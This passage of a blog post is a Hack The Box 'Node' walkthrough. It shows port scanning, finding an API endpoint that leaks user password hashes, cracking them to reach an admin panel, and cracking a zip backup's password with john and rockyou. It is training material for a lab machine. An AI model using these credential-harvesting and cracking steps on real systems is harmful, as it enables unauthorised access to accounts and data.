<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="theme" content="Chirpy v2.7.2"><meta name="generator" content="Jekyll v4.2.0" /><meta property="og:title" content="Hack The Box - Node (Without Metasploit)" /><meta name="author" content="rizemon" /><meta property="og:locale" content="en_US" /><meta name="description" content="Just bloggin cyber security related content." /><meta property="og:description" content="Just bloggin cyber security related content." /><link rel="canonical" href="https://rizemon.github.io/posts/node-htb/" /><meta property="og:url" content="https://rizemon.github.io/posts/node-htb/" /><meta property="og:site_name" content="rizemon’s blog" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2021-01-15T22:16:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Hack The Box - Node (Without Metasploit)" /><meta name="twitter:site" content="@rizemon" /><meta name="twitter:creator" content="@rizemon" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"rizemon"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://rizemon.github.io/posts/node-htb/"},"description":"Just bloggin cyber security related content.","url":"https://rizemon.github.io/posts/node-htb/","@type":"BlogPosting","headline":"Hack The Box - Node (Without Metasploit)","dateModified":"2021-01-15T22:16:00+08:00","datePublished":"2021-01-15T22:16:00+08:00","@context":"https://schema.org"}</script><title>Hack The Box - Node (Without Metasploit) | rizemon's blog</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" href="/assets/css/post.css" as="style"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id="></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); }); </script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/portfolio.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">rizemon's blog</a></div><div class="site-subtitle font-italic">Cyber Security Enthusiast.</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/tabs/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tabs/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/tabs/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/tabs/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT ME</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/rizemon" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/rizemon" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hack The Box - Node (Without Metasploit)</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hack The Box - Node (Without Metasploit)</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Fri, Jan 15, 2021, 10:16 PM +0800" > Jan 15, 2021 <i class="unloaded">2021-01-15T22:16:00+08:00</i> </span> by <span class="author"> rizemon </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2510 words">13 min</span></div></div><div class="post-content"><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node.png" alt="" height="414px" width="615px" /></p><h1 id="configuration">Configuration</h1><p>The operating system that I will be using to tackle this machine is a Kali Linux VM.</p><p>What I learnt from other writeups is that it was a good habit to map a domain name to the machine’s IP address so as that it will be easier to remember. This can done by appending a line to <code class="language-plaintext highlighter-rouge">/etc/hosts</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"10.10.10.58 node.htb"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
</pre></table></code></div></div><h1 id="reconnaissance">Reconnaissance</h1><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
</pre><td class="rouge-code"><pre><span class="nv">$ </span>rustscan <span class="nt">--accessible</span> <span class="nt">-a</span> node.htb <span class="nt">-r</span> 1-65535 <span class="nt">--</span> <span class="nt">-sT</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-Pn</span>
File limit higher than batch size. Can increase speed by increasing batch size <span class="s1">'-b 1048476'</span><span class="nb">.</span>
Open 10.10.10.58:22
Open 10.10.10.58:3000
Starting Script<span class="o">(</span>s<span class="o">)</span>
Script to be run Some<span class="o">(</span><span class="s2">"nmap -vvv -p  "</span><span class="o">)</span>

Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-01-15 00:25 UTC
NSE: Loaded 151 scripts <span class="k">for </span>scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
Initiating Connect Scan at 00:25
Scanning node.htb <span class="o">(</span>10.10.10.58<span class="o">)</span> <span class="o">[</span>2 ports]
Discovered open port 22/tcp on 10.10.10.58
Discovered open port 3000/tcp on 10.10.10.58
Completed Connect Scan at 00:25, 0.00s elapsed <span class="o">(</span>2 total ports<span class="o">)</span>
Initiating Service scan at 00:25
Scanning 2 services on node.htb <span class="o">(</span>10.10.10.58<span class="o">)</span>
Completed Service scan at 00:25, 11.04s elapsed <span class="o">(</span>2 services on 1 host<span class="o">)</span>
NSE: Script scanning 10.10.10.58.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 1.22s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
Nmap scan report <span class="k">for </span>node.htb <span class="o">(</span>10.10.10.58<span class="o">)</span>
Host is up, received user-set <span class="o">(</span>0.0047s latency<span class="o">)</span><span class="nb">.</span>
Scanned at 2021-01-15 00:25:24 UTC <span class="k">for </span>13s

PORT     STATE SERVICE         REASON  VERSION
22/tcp   open  ssh             syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da <span class="o">(</span>RSA<span class="o">)</span>
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb
|   256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c <span class="o">(</span>ECDSA<span class="o">)</span>
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU<span class="o">=</span>
|   256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 <span class="o">(</span>ED25519<span class="o">)</span>
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y
3000/tcp open  hadoop-datanode syn-ack Apache Hadoop
| hadoop-datanode-info: 
|_  Logs: /login
| hadoop-tasktracker-info: 
|_  Logs: /login
|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MyPlace
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 2 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
NSE: Starting runlevel 3 <span class="o">(</span>of 3<span class="o">)</span> scan.
Initiating NSE at 00:25
Completed NSE at 00:25, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>12.97 seconds
</pre></table></code></div></div><h1 id="enumeration-1">Enumeration (1)</h1><h2 id="port-3000-expressjs">Port 3000 <code class="language-plaintext highlighter-rouge">ExpressJS</code></h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node1.png" alt="" /></p><p>This looks like a company website. The only thing we have is a <code class="language-plaintext highlighter-rouge">Login</code> button, but unfortunately we cannot do much with it.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node1.png" alt="" /></p><p>If you enter into <code class="language-plaintext highlighter-rouge">Firefox</code>’s web console, navigate to <code class="language-plaintext highlighter-rouge">Network</code> and refresh the page, you will see that there are many different <code class="language-plaintext highlighter-rouge">javascript</code> files being loaded.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node2.png" alt="" /></p><p><code class="language-plaintext highlighter-rouge">home.js</code>:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">controllers</span> <span class="o">=</span> <span class="nx">angular</span><span class="p">.</span><span class="nx">module</span><span class="p">(</span><span class="dl">'</span><span class="s1">controllers</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">controllers</span><span class="p">.</span><span class="nx">controller</span><span class="p">(</span><span class="dl">'</span><span class="s1">HomeCtrl</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">$scope</span><span class="p">,</span> <span class="nx">$http</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$http</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/users/latest</span><span class="dl">'</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">$scope</span><span class="p">.</span><span class="nx">users</span> <span class="o">=</span> <span class="nx">res</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
  <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>It seems that there is an endpoint at <code class="language-plaintext highlighter-rouge">/api/users/latest</code>. If we visit it, we see a bunch of usernames and password hashes!</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node3.png" alt="" /></p><p>However if we take these hashes and crack them with <code class="language-plaintext highlighter-rouge">Crackstation</code>, we would only retrieve 2/3 of the passwords.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node4.png" alt="" /></p><p>If we use any of these credentials to login, we would get a message saying the control panel is only available to admin users, and according to the data we got from <code class="language-plaintext highlighter-rouge">/api/users/latest</code>, <code class="language-plaintext highlighter-rouge">is_admin</code> is set to <code class="language-plaintext highlighter-rouge">false</code>! I didn’t see any way to overwrite this <code class="language-plaintext highlighter-rouge">is_admin</code> to <code class="language-plaintext highlighter-rouge">true</code>, so we have to look for other ways.</p><p><code class="language-plaintext highlighter-rouge">profile.js</code>:</p><div class="language-javascript highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">controllers</span> <span class="o">=</span> <span class="nx">angular</span><span class="p">.</span><span class="nx">module</span><span class="p">(</span><span class="dl">'</span><span class="s1">controllers</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">controllers</span><span class="p">.</span><span class="nx">controller</span><span class="p">(</span><span class="dl">'</span><span class="s1">ProfileCtrl</span><span class="dl">'</span><span class="p">,</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">$scope</span><span class="p">,</span> <span class="nx">$http</span><span class="p">,</span> <span class="nx">$routeParams</span><span class="p">)</span> <span class="p">{</span>
  <span class="nx">$http</span><span class="p">.</span><span class="kd">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/api/users/</span><span class="dl">'</span> <span class="o">+</span> <span class="nx">$routeParams</span><span class="p">.</span><span class="nx">username</span><span class="p">)</span>
    <span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="kd">function</span> <span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">$scope</span><span class="p">.</span><span class="nx">user</span> <span class="o">=</span> <span class="nx">res</span><span class="p">.</span><span class="nx">data</span><span class="p">;</span>
    <span class="p">},</span> <span class="kd">function</span> <span class="p">(</span><span class="nx">res</span><span class="p">)</span> <span class="p">{</span>
      <span class="nx">$scope</span><span class="p">.</span><span class="nx">hasError</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>

      <span class="k">if</span> <span class="p">(</span><span class="nx">res</span><span class="p">.</span><span class="nx">status</span> <span class="o">==</span> <span class="mi">404</span><span class="p">)</span> <span class="p">{</span>
        <span class="nx">$scope</span><span class="p">.</span><span class="nx">errorMessage</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">This user does not exist</span><span class="dl">'</span><span class="p">;</span>
      <span class="p">}</span>
      <span class="k">else</span> <span class="p">{</span>
        <span class="nx">$scope</span><span class="p">.</span><span class="nx">errorMessage</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">An unexpected error occurred</span><span class="dl">'</span><span class="p">;</span>
      <span class="p">}</span>
    <span class="p">});</span>
<span class="p">});</span>
</pre></table></code></div></div><p>There was also a similar route <code class="language-plaintext highlighter-rouge">/api/users/</code>, takes in a <code class="language-plaintext highlighter-rouge">username</code> at the back. Lets try with <code class="language-plaintext highlighter-rouge">tom</code>.</p><p><code class="language-plaintext highlighter-rouge">/api/users/tom</code>:<br /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node5.png" alt="" /></p><p>It only shows the user information on one user instead of multiple users. But what happens when we do not put a <code class="language-plaintext highlighter-rouge">username</code>?</p><p><code class="language-plaintext highlighter-rouge">/api/users</code>: <br /> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node6.png" alt="" /></p><p>We now see an addtional user <code class="language-plaintext highlighter-rouge">myP14ceAdm1nAcc0uNT</code> and his <code class="language-plaintext highlighter-rouge">is_admin</code> is set to <code class="language-plaintext highlighter-rouge">true</code>, so he must be able to access the control panel. Lets use <code class="language-plaintext highlighter-rouge">Crackstation</code> again to use his hash.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node7.png" alt="" /></p><p>Now if we login with <code class="language-plaintext highlighter-rouge">myP14ceAdm1nAcc0uNT:manchester</code>, we will see a <code class="language-plaintext highlighter-rouge">Download Backup</code> button.</p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="/assets/images/node7.png" alt="" /></p><p>Clicking it will download a file called <code class="language-plaintext highlighter-rouge">myplace.backup</code>. If we open it, we will get a bunch of random alphanumeric characters. However at the end we will see some <code class="language-plaintext highlighter-rouge">=</code>.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>myplace.backup
...
AAAAAAQAAALSBLPQlAHZhci93d3cvbXlwbGFjZS9zdGF0aWMvcGFydGlhbHMvcHJvZmlsZS5odG1sVVQFAAMimapZdXgLAAEEAAAAAAQAAAAAUEsBAh4DFAAJAAgAfWMiS4Tw22u4BAAAFQ8AABgAGAAAAAAAAQAAALSBtvUlAHZhci93d3cvbXlwbGFjZS9hcHAuaHRtbFVUBQADvpWqWXV4CwABBAAAAAAEAAAAAFBLBQYAAAAAXwNfA3edAQDQ+iUAAAA<span class="o">=</span>
</pre></table></code></div></div><p>Using the <code class="language-plaintext highlighter-rouge">base64</code>, we can decode it and save the results to another file.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat </span>myplace.backup | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> results
</pre></table></code></div></div><p>The resulting file is a <code class="language-plaintext highlighter-rouge">zip</code> file!</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ file results             
results: Zip archive data, at least v1.0 to extract
</pre></table></code></div></div><p>Lets try to unzip it.</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">mv </span>results results.zip                                                                     
<span class="nv">$ </span>unzip results.zip 
Archive:  results.zip
   creating: var/www/myplace/
<span class="o">[</span>results.zip] var/www/myplace/package-lock.json password:
</pre></table></code></div></div><p>We are immediately prompted for a password. We can use <code class="language-plaintext highlighter-rouge">zip2john</code> to retrieve a hash which we can crack to get the password!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span>zip2john results.zip <span class="o">&gt;</span> hash.txt
<span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt 
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
Will run 4 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
magicword        <span class="o">(</span>output.zip<span class="o">)</span>
1g 0:00:00:00 DONE <span class="o">(</span>2021-01-14 20:16<span class="o">)</span> 50.00g/s 9420Kp/s 9420Kc/s 9420KC/s sandrea..becky21
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed
</pre></table></code></div></div><p>After unzipping it by using the <code class="language-plaintext highlighter-rouge">magicword</code> as the password, we obtain what seems to be the source of the web application!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-al</span> ./var/www/myplace
total 56
drwxr-xr-x  4 kali kali  4096 Sep  3  2017 <span class="nb">.</span>
drwxr-xr-x  3 kali kali  4096 Jan 15 07:37 ..
<span class="nt">-rw-rw-r--</span>  1 kali kali  3861 Sep  2  2017 app.html
<span class="nt">-rw-rw-r--</span>  1 kali kali  8058 Sep  3  2017 app.js
drwxr-xr-x 69 kali kali  4096 Sep  1  2017 node_modules
<span class="nt">-rw-rw-r--</span>  1 kali kali   283 Sep  1  2017 package.json
<span class="nt">-rw-r--r--</span>  1 kali kali 21264 Sep  1  2017 package-lock.json
drwxrwxr-x  6 kali kali  4096 Sep  1  2017 static
</pre></table></code></div></div><p>If we view <code class="language-plaintext highlighter-rouge">app.js</code>, we find some <code class="language-plaintext highlighter-rouge">MongoDB</code> credentials!</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="nv">$ </span><span class="nb">cat</span> ./var/www/myplace/app.js            
...
